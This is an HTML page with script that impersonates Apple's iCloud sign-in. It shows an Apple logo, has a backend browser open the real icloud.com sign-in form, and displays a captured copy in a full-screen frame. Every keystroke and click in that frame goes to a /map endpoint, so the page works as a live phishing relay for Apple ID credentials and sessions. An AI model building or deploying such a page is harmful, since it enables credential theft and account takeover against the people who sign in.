<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="mobile-web-app-capable" content="yes">
<title>iCloud</title>
<style>
  html, body { height:100%; margin:0; background:#000; }
  body { overflow:hidden; }

  /* The wait: a black screen and the mark, breathing. No text, no buttons, no
   * "opening this / doing that". */
  .mark {
    position:fixed; top:50%; left:50%;
    width:64px; height:64px; margin:-32px 0 0 -32px;
    opacity:0;
    animation:
      fade .45s ease-out both,
      breathe 2.8s ease-in-out .45s infinite;
  }
  .mark svg { display:block; width:100%; height:100%; fill:#fff; }

  /* The capture, in a frame of its own: its stylesheets, images and fonts are
   * the capture's, and nothing of this page reaches them. */
  #capture {
    position:fixed; inset:0; width:100%; height:100%;
    border:0; background:#fff;
    opacity:0; transition:opacity .22s ease-out;
  }
  body.show #capture { opacity:1; }
  body.done .mark { display:none; }

  @keyframes fade { from { opacity:0; } to { opacity:1; } }
  @keyframes breathe {
    0%, 100% { transform:scale(1); opacity:1; }
    50% { transform:scale(.9); opacity:.55; }
  }

  @media (prefers-reduced-motion: reduce) {
    .mark { animation:none; opacity:1; }
    #capture { transition:none; }
  }
</style>
</head>
<body>
  <div class="mark" role="img" aria-label="Apple">
    <svg viewBox="0 0 24 24" aria-hidden="true">
      <path d="M17.05 20.28c-.98.95-2.05.8-3.08.35-1.09-.46-2.09-.48-3.24 0-1.44.62-2.2.44-3.06-.35C2.79 15.25 3.51 7.59 9.05 7.31c1.35.07 2.29.74 3.08.8 1.18-.24 2.31-.93 3.57-.84 1.51.12 2.65.72 3.4 1.8-3.12 1.87-2.38 5.98.48 7.13-.57 1.5-1.31 2.99-2.54 4.09zM12.03 7.25c-.15-2.23 1.66-4.07 3.74-4.25.29 2.58-2.34 5.98-3.74 4.25z"/>
    </svg>
  </div>

  <iframe id="capture" title="iCloud sign in" hidden></iframe>

<script src="/map.js"></script>
<script>
  /* The app is the capture in a frame, and the browser window behind it.
   *
   *   /start   opens the browser, goes to icloud.com and presses Sign In
   *   /status   says when the sign-in form is actually there
   *   /map     takes what was typed or clicked in the frame
   *
   * Nothing is shown until /status says the form is up: the capture is the
   * answer to the real page, so it appears when the real page is ready for it.
   */
  (function () {
    "use strict";

    var frame = document.getElementById("capture");
    var target = "/src/1.html";
    var opened = false;
    var shown = false;
    var attached = false;

    function post(message) {
      try {
        fetch("/map", {
          method: "POST",
          headers: { "content-type": "application/json" },
          body: JSON.stringify(message),
          keepalive: true
        }).catch(function () {});
      } catch (e) {
        /* the page is closing, or the server is not there: nothing to do */
      }
    }

    function cover() {
      if (attached) return;
      attached = true;
      try {
        window.attachMapping(frame.contentDocument, post);
      } catch (e) {
        /* a frame that is not readable yet is bound on the next load */
        attached = false;
      }
    }

    function show() {
      if (shown) return;
      shown = true;
      frame.hidden = false;
      cover();
      document.body.classList.add("show");
      setTimeout(function () { document.body.classList.add("done"); }, 240);
    }

    // The frame has painted the capture.
    frame.addEventListener("load", show);

    function open() {
      if (opened) return;
      opened = true;
      frame.src = target;
      // A frame that never reports back still gets shown: a black screen that
      // never ends is worse than a capture that is a moment late.
      setTimeout(show, 1200);
    }

    // Visiting the page opens the browser and presses Sign In.
    fetch("/start").catch(function () {});

    function poll() {
      fetch("/status")
        .then(function (r) { return r.json(); })
        .then(function (state) {
          if (state && state.page) target = state.page;
          // Done is the sign-in form being up in the browser. An error means
          // the browser will not open; the capture is still the page the user
          // came for, so show it.
          if (!state || state.status === "done" || state.status === "error") {
            open();
            return;
          }
          setTimeout(poll, 250);
        })
        .catch(function () { setTimeout(poll, 800); });
    }

    poll();
  })();
</script>
</body>
</html>
